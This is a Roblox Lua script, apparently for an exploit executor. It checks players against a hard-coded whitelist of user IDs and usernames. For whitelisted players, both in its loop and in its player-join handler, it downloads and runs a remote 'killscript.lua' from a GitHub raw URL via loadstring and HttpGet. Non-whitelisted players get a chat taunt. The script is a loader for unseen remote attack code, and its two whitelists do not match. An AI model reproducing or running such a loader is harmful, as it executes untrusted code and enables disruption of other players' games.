local Players = game:GetService("Players") -- you should use GetService over game.Players!
        for _, player in pairs(Players:GetPlayers()) do
        -- this code will run for all players
            if player.UserId == 1947783536 or player.UserId == 1570719229 or player.UserId == 8195210 or player.UserId == 28357488 or player.UserId == 17260230 or player.UserId == 201454243 or player.UserId == 179520654 then  
                wait(1)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/q2eq3q3fw/killscript.lua/main/killscript.lua"))()
            else
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("u r not whitelisted")
        end
    end
        
        
        local AdminList = {
        1947783536, -- rayan77x_1  
        1570719229,  -- wtrook      
        8195210,   -- Benoxa
        822999,    -- AStrongMuscle  
        28357488,  -- UziGarage    
        17260230,  -- NikoSenpai 
        201454243, -- Papa_Mbaye 
        179520654, -- tuhklia 
        
    }
    
    game.Players.PlayerAdded:Connect(function(player)
        for i, v in pairs(AdminList) do
            if player.UserId == v then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Whitelisted";
                    Text = "Whitelisted already";
                     Duration = 20;
                     })
                 wait(2)
               loadstring(game:HttpGet("https://raw.githubusercontent.com/q2eq3q3fw/killscript.lua/main/killscript.lua"))();
    
            end
        end
    end)
